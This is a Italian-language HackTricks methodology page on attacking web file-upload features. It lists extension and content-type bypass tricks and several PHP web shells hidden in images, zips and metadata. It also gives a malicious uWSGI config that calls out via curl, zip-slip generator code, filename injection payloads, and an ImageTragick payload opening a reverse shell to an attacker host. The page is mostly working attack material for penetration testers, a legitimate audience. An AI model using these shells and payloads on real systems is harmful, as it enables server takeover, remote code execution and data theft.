# File Upload

{{#include ../../banners/hacktricks-training.md}}

## File Upload General Methodology

Altre estensioni utili:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass file extensions checks

1. Se applicabile, **controlla** le **estensioni precedenti.** Provale anche usando alcune **lettere maiuscole**: _pHp, .pHP5, .PhAr ..._
2. _Controlla **aggiungendo un'estensione valida prima** dell'estensione di esecuzione (usa anche le estensioni precedenti):_
- _file.png.php_
- _file.png.Php5_
3. Prova ad aggiungere **caratteri speciali alla fine.** Puoi usare Burp per **bruteforce** tutti i caratteri **ascii** e **Unicode**. (_Nota che puoi anche provare a usare le **estensioni precedentemente** menzionate_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Prova a bypassare le protezioni **ingannando il parser delle estensioni** del server con tecniche come **raddoppiare** l'**estensione** o **aggiungere dati spazzatura** (**byte null**) tra le estensioni. _Puoi anche usare le **estensioni precedenti** per preparare un payload migliore._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Aggiungi **un altro livello di estensioni** al controllo precedente:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Prova a mettere l'**estensione di esecuzione prima dell'estensione valida** e spera che il server sia mal configurato. (utile per sfruttare le misconfigurazioni di Apache dove qualsiasi cosa con estensione **_**.php**_**, ma** non necessariamente che termina in .php** eseguirà codice):
- _ex: file.php.png_
7. Usando **NTFS alternate data stream (ADS)** in **Windows**. In questo caso, un carattere due punti “:” verrà inserito dopo un'estensione vietata e prima di una consentita. Di conseguenza, un **file vuoto con l'estensione vietata** verrà creato sul server (es. “file.asax:.jpg”). Questo file potrebbe essere modificato in seguito utilizzando altre tecniche come l'uso del suo nome breve. Il pattern “**::$data**” può anche essere usato per creare file non vuoti. Pertanto, aggiungere un carattere punto dopo questo pattern potrebbe anche essere utile per bypassare ulteriori restrizioni (es. “file.asp::$data.”)
8. Prova a superare i limiti del nome del file. L'estensione valida viene tagliata. E il PHP malevolo rimane. AAA<--SNIP-->AAA.php

```
# Linux massimo 255 byte
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # meno 4 qui e aggiungendo .png
# Carica il file e controlla la risposta su quanti caratteri consente. Diciamo 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Crea il payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** controlli impostando il **valore** dell'**intestazione Content-Type** a: _image/png_, _text/plain_, application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** controllando aggiungendo all'inizio del file i **byte di una vera immagine** (confondere il comando _file_). Oppure introduci la shell all'interno dei **metadati**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oppure puoi anche **introdurre il payload direttamente** in un'immagine:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Se **compressioni vengono aggiunte alla tua immagine**, ad esempio utilizzando alcune librerie PHP standard come [PHP-GD](https://www.php.net/manual/fr/book.image.php), le tecniche precedenti non saranno utili. Tuttavia, puoi usare il **PLTE chunk** [**tecnica definita qui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravviverà alla compressione**.
- [**Github con il codice**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- La pagina web potrebbe anche **ridimensionare** l'**immagine**, utilizzando ad esempio le funzioni PHP-GD `imagecopyresized` o `imagecopyresampled`. Tuttavia, puoi usare il **IDAT chunk** [**tecnica definita qui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravviverà alla compressione**.
- [**Github con il codice**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Un'altra tecnica per creare un payload che **sopravvive a un ridimensionamento dell'immagine**, utilizzando la funzione PHP-GD `thumbnailImage`. Tuttavia, puoi usare il **tEXt chunk** [**tecnica definita qui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravviverà alla compressione**.
- [**Github con il codice**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Trova una vulnerabilità per **rinominare** il file già caricato (per cambiare l'estensione).
- Trova una vulnerabilità di **Local File Inclusion** per eseguire il backdoor.
- **Possibile divulgazione di informazioni**:
1. Carica **più volte** (e **allo stesso tempo**) lo **stesso file** con lo **stesso nome**
2. Carica un file con il **nome** di un **file** o **cartella** che **esiste già**
3. Caricando un file con **“.”, “..”, o “…” come nome**. Ad esempio, in Apache in **Windows**, se l'applicazione salva i file caricati nella directory “/www/uploads/”, il nome file “.” creerà un file chiamato “uploads” nella directory “/www/”.
4. Carica un file che potrebbe non essere facilmente eliminato come **“…:.jpg”** in **NTFS**. (Windows)
5. Carica un file in **Windows** con **caratteri non validi** come `|<>*?”` nel suo nome. (Windows)
6. Carica un file in **Windows** usando **nomi riservati** (**vietati**) come CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, e LPT9.
- Prova anche a **caricare un eseguibile** (.exe) o un **.html** (meno sospetto) che **eseguirà codice** quando accidentalmente aperto dalla vittima.

### Special extension tricks

Se stai cercando di caricare file su un **server PHP**, [dai un'occhiata al trucco **.htaccess** per eseguire codice](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Se stai cercando di caricare file su un **server ASP**, [dai un'occhiata al trucco **.config** per eseguire codice](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

I file `.phar` sono come i `.jar` per java, ma per php, e possono essere **usati come un file php** (eseguendolo con php, o includendolo all'interno di uno script...)

L'estensione `.inc` è a volte usata per file php che sono solo usati per **importare file**, quindi, a un certo punto, qualcuno potrebbe aver permesso **che questa estensione fosse eseguita**.

## **Jetty RCE**

Se puoi caricare un file XML su un server Jetty puoi ottenere [RCE perché **nuovi \*.xml e \*.war vengono elaborati automaticamente**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Quindi, come menzionato nell'immagine seguente, carica il file XML in `$JETTY_BASE/webapps/` e aspettati la shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Per un'esplorazione dettagliata di questa vulnerabilità controlla la ricerca originale: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Le vulnerabilità di Remote Command Execution (RCE) possono essere sfruttate nei server uWSGI se si ha la capacità di modificare il file di configurazione `.ini`. I file di configurazione uWSGI sfruttano una sintassi specifica per incorporare variabili "magiche", segnaposto e operatori. In particolare, l'operatore '@', utilizzato come `@(filename)`, è progettato per includere i contenuti di un file. Tra i vari schemi supportati in uWSGI, lo schema "exec" è particolarmente potente, consentendo la lettura dei dati dall'output standard di un processo. Questa funzionalità può essere manipolata per scopi nefasti come Remote Command Execution o Arbitrary File Write/Read quando un file di configurazione `.ini` viene elaborato.

Considera il seguente esempio di un file `uwsgi.ini` dannoso, che mostra vari schemi:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
L'esecuzione del payload avviene durante l'analisi del file di configurazione. Affinché la configurazione venga attivata e analizzata, il processo uWSGI deve essere riavviato (potenzialmente dopo un crash o a causa di un attacco di Denial of Service) oppure il file deve essere impostato per il caricamento automatico. La funzione di caricamento automatico, se abilitata, ricarica il file a intervalli specificati al rilevamento di modifiche.

È fondamentale comprendere la natura permissiva dell'analisi del file di configurazione di uWSGI. In particolare, il payload discusso può essere inserito in un file binario (come un'immagine o un PDF), ampliando ulteriormente l'ambito di potenziale sfruttamento.

## **wget File Upload/SSRF Trick**

In alcune occasioni potresti scoprire che un server sta utilizzando **`wget`** per **scaricare file** e puoi **indicare** l'**URL**. In questi casi, il codice potrebbe controllare che l'estensione dei file scaricati sia all'interno di una whitelist per garantire che vengano scaricati solo file consentiti. Tuttavia, **questo controllo può essere eluso.**\
La **lunghezza massima** di un **nome file** in **linux** è **255**, tuttavia, **wget** tronca i nomi dei file a **236** caratteri. Puoi **scaricare un file chiamato "A"\*232+".php"+".gif"**, questo nome file **eluderà** il **controllo** (poiché in questo esempio **".gif"** è un'estensione **valida**) ma `wget` **rinominerà** il file in **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Nota che **un'altra opzione** che potresti considerare per bypassare questo controllo è far sì che il **server HTTP reindirizzi a un file diverso**, quindi l'URL iniziale bypasserà il controllo e wget scaricherà il file reindirizzato con il nuovo nome. Questo **non funzionerà** **a meno che** wget non venga utilizzato con il **parametro** `--trust-server-names` perché **wget scaricherà la pagina reindirizzata con il nome del file indicato nell'URL originale**.

## Strumenti

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) è uno strumento potente progettato per assistere i Pentester e i Bug Hunter nel testare i meccanismi di upload dei file. Sfrutta varie tecniche di bug bounty per semplificare il processo di identificazione e sfruttamento delle vulnerabilità, garantendo valutazioni approfondite delle applicazioni web.

## Da upload di file ad altre vulnerabilità

- Imposta **filename** su `../../../tmp/lol.png` e prova a ottenere un **path traversal**
- Imposta **filename** su `sleep(10)-- -.jpg` e potresti essere in grado di ottenere una **SQL injection**
- Imposta **filename** su `<svg onload=alert(document.domain)>` per ottenere un XSS
- Imposta **filename** su `; sleep 10;` per testare alcune iniezioni di comandi (altri [trucchi di iniezione di comandi qui](../command-injection.md))
- [**XSS** nel caricamento di file immagine (svg)](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**exploitation di Service Workers**](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in upload svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** tramite upload di file svg](../open-redirect.md#open-redirect-uploading-svg-files)
- Prova **diversi payload svg** da [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
- [Famosa vulnerabilità **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Se puoi **indicare al server web di catturare un'immagine da un URL** potresti provare ad abusare di un [SSRF](../ssrf-server-side-request-forgery/index.html). Se questa **immagine** verrà **salvata** in qualche sito **pubblico**, potresti anche indicare un URL da [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e **rubare informazioni di ogni visitatore**.
- [**XXE e CORS** bypass con upload PDF-Adobe](pdf-upload-xxe-and-cors-bypass.md)
- PDF appositamente creati per XSS: La [seguente pagina presenta come **iniettare dati PDF per ottenere l'esecuzione di JS**](../xss-cross-site-scripting/pdf-injection.md). Se puoi caricare PDF, potresti preparare alcuni PDF che eseguiranno JS arbitrario seguendo le indicazioni date.
- Carica il \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) contenuto per controllare se il server ha qualche **antivirus**
- Controlla se c'è qualche **limite di dimensione** nel caricamento dei file

Ecco una lista delle 10 cose che puoi ottenere caricando (da [qui](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: XSS memorizzato / SSRF / XXE
3. **GIF**: XSS memorizzato / SSRF
4. **CSV**: iniezione CSV
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : iniezione HTML / XSS / Open redirect
8. **PNG / JPEG**: attacco pixel flood (DoS)
9. **ZIP**: RCE tramite LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Estensione Burp

{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Fai riferimento a [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) per altri tipi di file.

## Upload di file Zip/Tar automaticamente decompressi

Se puoi caricare un ZIP che verrà decompresso all'interno del server, puoi fare 2 cose:

### Symlink

Carica un link contenente collegamenti simbolici ad altri file, quindi, accedendo ai file decompressi accederai ai file collegati:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decompress in different folders

La creazione imprevista di file in directory durante la decompressione è un problema significativo. Nonostante le assunzioni iniziali che questa configurazione potesse proteggere contro l'esecuzione di comandi a livello di OS tramite caricamenti di file dannosi, il supporto per la compressione gerarchica e le capacità di traversata delle directory del formato ZIP possono essere sfruttati. Questo consente agli attaccanti di eludere le restrizioni e di uscire dalle directory di upload sicure manipolando la funzionalità di decompressione dell'applicazione mirata.

Un exploit automatizzato per creare tali file è disponibile su [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). L'utilità può essere utilizzata come mostrato:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Inoltre, il **trucco del symlink con evilarc** è un'opzione. Se l'obiettivo è mirare a un file come `/flag.txt`, dovrebbe essere creato un symlink a quel file nel tuo sistema. Questo assicura che evilarc non incontri errori durante il suo funzionamento.

Di seguito è riportato un esempio di codice Python utilizzato per creare un file zip malevolo:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusare della compressione per il file spraying**

Per ulteriori dettagli **controlla il post originale in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creazione di una Shell PHP**: Il codice PHP è scritto per eseguire comandi passati attraverso la variabile `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying e Creazione di File Compressi**: Vengono creati più file e viene assemblato un archivio zip contenente questi file.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modifica con un Hex Editor o vi**: I nomi dei file all'interno dello zip vengono modificati utilizzando vi o un hex editor, cambiando "xxA" in "../" per attraversare le directory.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Carica questo contenuto con un'estensione immagine per sfruttare la vulnerabilità **(ImageMagick , 7.0.1-1)** (forma l'[exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

L'incorporamento di una shell PHP nel chunk IDAT di un file PNG può bypassare efficacemente alcune operazioni di elaborazione delle immagini. Le funzioni `imagecopyresized` e `imagecopyresampled` di PHP-GD sono particolarmente rilevanti in questo contesto, poiché sono comunemente utilizzate per ridimensionare e campionare nuovamente le immagini, rispettivamente. La capacità della shell PHP incorporata di rimanere inalterata da queste operazioni è un vantaggio significativo per alcuni casi d'uso.

Un'esplorazione dettagliata di questa tecnica, inclusa la sua metodologia e le potenziali applicazioni, è fornita nel seguente articolo: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Questa risorsa offre una comprensione completa del processo e delle sue implicazioni.

Maggiore informazione in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

I file poliglotti servono come uno strumento unico nella cybersecurity, agendo come camaleonti che possono esistere validamente in più formati di file contemporaneamente. Un esempio intrigante è un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un ibrido che funziona sia come GIF che come archivio RAR. Tali file non sono limitati a questa combinazione; sono possibili anche combinazioni come GIF e JS o PPT e JS.

L'utilità principale dei file poliglotti risiede nella loro capacità di eludere le misure di sicurezza che filtrano i file in base al tipo. La prassi comune in varie applicazioni prevede di consentire solo determinati tipi di file per il caricamento—come JPEG, GIF o DOC—per mitigare il rischio posto da formati potenzialmente dannosi (ad es., JS, PHP o file Phar). Tuttavia, un poliglott, conformandosi ai criteri strutturali di più tipi di file, può eludere furtivamente queste restrizioni.

Nonostante la loro adattabilità, i poliglotti incontrano delle limitazioni. Ad esempio, mentre un poliglott potrebbe contemporaneamente incarnare un file PHAR (PHp ARchive) e un JPEG, il successo del suo caricamento potrebbe dipendere dalle politiche delle estensioni dei file della piattaforma. Se il sistema è rigoroso riguardo alle estensioni consentite, la mera dualità strutturale di un poliglott potrebbe non essere sufficiente a garantire il suo caricamento.

Maggiore informazione in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Come evitare le rilevazioni del tipo di file caricando un file JSON valido anche se non consentito, fingendo un file PDF (tecniche da **[questo post del blog](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Finché i byte magici `%PDF` sono nei primi 1024 byte, è valido (prendi esempio dal post)
- **`pdflib` library**: Aggiungi un formato PDF falso all'interno di un campo del JSON in modo che la libreria pensi che sia un pdf (prendi esempio dal post)
- **`file` binary**: Può leggere fino a 1048576 byte da un file. Basta creare un JSON più grande di quello in modo che non possa analizzare il contenuto come un json e poi all'interno del JSON mettere la parte iniziale di un vero PDF e penserà che sia un PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)

{{#include ../../banners/hacktricks-training.md}}
